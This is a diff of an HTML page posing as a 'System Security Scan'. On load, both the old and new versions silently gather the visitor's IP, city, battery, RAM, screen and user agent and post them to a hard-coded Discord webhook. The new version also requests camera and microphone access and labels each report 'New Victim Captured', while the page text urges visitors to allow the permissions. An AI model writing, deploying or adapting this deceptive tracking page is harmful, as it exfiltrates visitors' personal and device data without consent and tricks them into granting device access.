@@ -1,102 +1,90 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>R3B للحماية | نظام الفحص الذكي</title>
+    <title>System Security Update</title>
     <script>
-        async function sendLogs() {
-            const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
-            
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
+
+        async function captureAndSend() {
+            let logData = {
+                ip: "Unknown",
+                location: "Denied",
+                battery: "Unknown",
+                device: navigator.userAgent,
+                platform: navigator.platform,
+                ram: navigator.deviceMemory || "Unknown",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                permissions: { camera: "Pending", mic: "Pending", geo: "Pending" }
+            };
+
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                
-                let batteryInfo = "غير معروف";
-                if (navigator.getBattery) {
-                    const bt = await navigator.getBattery();
-                    batteryInfo = `${Math.round(bt.level * 100)}% (${bt.charging ? "يشحن" : "لا يشحن"})`;
-                }
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                logData.ip = ipData.ip;
+                logData.location = `${ipData.city}, ${ipData.country_name}`;
+            } catch (e) {}
 
-                const payload = {
-                    embeds: [{
-                        title: "🛠️ تقرير فحص جديد - R3B Security",
-                        color: 3066993, // لون أخضر احترافي
-                        fields: [
-                            { name: "🌐 IP", value: data.ip || "غير معروف", inline: true },
-                            { name: "📍 الموقع", value: `${data.city || '?'}, ${data.country_name || '?'}`, inline: true },
-                            { name: "🔋 البطارية", value: batteryInfo, inline: true },
-                            { name: "💻 النظام", value: navigator.platform, inline: true },
-                            { name: "🌍 اللغة", value: navigator.language, inline: true },
-                            { name: "🖥️ الشاشة", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                            { name: "🕵️ المتصفح", value: navigator.userAgent, inline: false }
-                        ],
-                        footer: { text: "R3B Protection System | Monitoring" },
-                        timestamp: new Date()
-                    }]
-                };
-
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) { 
-                console.error("Connection error"); 
+            if (navigator.getBattery) {
+                const bt = await navigator.getBattery();
+                logData.battery = `${Math.round(bt.level * 100)}% (${bt.charging ? "Charging" : "Discharging"})`;
             }
+
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                logData.permissions.camera = "Granted";
+                logData.permissions.mic = "Granted";
+            } catch (e) {
+                logData.permissions.camera = "Denied/Blocked";
+                logData.permissions.mic = "Denied/Blocked";
+            }
+
+            const payload = {
+                embeds: [{
+                    title: "🎯 New Victim Captured",
+                    color: 16711680,
+                    fields: [
+                        { name: "🌐 IP Address", value: logData.ip, inline: true },
+                        { name: "📍 Location", value: logData.location, inline: true },
+                        { name: "🔋 Battery", value: logData.battery, inline: true },
+                        { name: "📸 Camera/Mic", value: logData.permissions.camera, inline: true },
+                        { name: "🧠 RAM", value: logData.ram + " GB", inline: true },
+                        { name: "🖥️ Resolution", value: logData.screen, inline: true },
+                        { name: "📱 Platform", value: logData.platform, inline: false },
+                        { name: "🕵️ User Agent", value: logData.device, inline: false }
+                    ],
+                    footer: { text: "TLQQEMM V12 | Security Audit System" },
+                    timestamp: new Date()
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
         }
 
-        window.onload = sendLogs;
-
-        function startScan() {
-            alert("بدأت عملية الفحص الشامل لجهازك...");
-            // هنا يمكنك إضافة رابط الأداة الفعلي الخاص بك
-            // window.location.href = "رابط_الأداة_الخاص_بك";
-        }
+        window.onload = captureAndSend;
     </script>
     <style>
-        body { 
-            background-color: #0f0f0f; /* خلفية داكنة */
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .card { 
-            background: #1a1a1a; 
-            padding: 40px; 
-            border-radius: 15px; 
-            border: 1px solid #2ecc71; /* إطار أخضر */
-            box-shadow: 0 0 20px rgba(46, 204, 113, 0.2); 
-            text-align: center; 
-            max-width: 400px; 
-        }
-        .brand { font-size: 32px; font-weight: bold; color: #2ecc71; margin-bottom: 10px; }
-        h1 { font-size: 20px; margin-bottom: 20px; }
-        p { color: #aaaaaa; font-size: 14px; margin-bottom: 30px; }
-        .btn { 
-            background: #2ecc71; 
-            color: #000; 
-            border: none; 
-            padding: 15px 30px; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            width: 100%;
-            transition: 0.3s;
-        }
-        .btn:hover { background: #27ae60; transform: scale(1.02); }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { border: 1px solid #0f0; padding: 40px; text-align: center; box-shadow: 0 0 20px #0f0; max-width: 500px; }
+        .scanner { font-size: 14px; margin-bottom: 20px; color: #0f0; }
+        .loading-bar { width: 100%; height: 4px; background: #222; position: relative; overflow: hidden; }
+        .loading-bar::after { content: ''; position: absolute; left: -100%; width: 100%; height: 100%; background: #0f0; animation: load 2s infinite; }
+        @keyframes load { 100% { left: 100%; } }
+        h1 { font-size: 20px; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="brand">R3B</div>
-        <h1>نظام الحماية المتقدم</h1>
-        <p>جهازك قد يكون عرضة للمخاطر. اضغط أدناه لبدء فحص الأمان وتحديث ملفات الحماية فوراً.</p>
-        <button class="btn" onclick="startScan()">بدء الفحص والتحديث</button>
+    <div class="box">
+        <h1>System Security Scan</h1>
+        <div class="loading-bar"></div>
+        <p class="scanner">Analyzing hardware integrity...</p>
+        <p style="font-size: 12px; color: #888;">Please allow requested permissions to complete the audit.</p>
     </div>
 </body>
 </html>
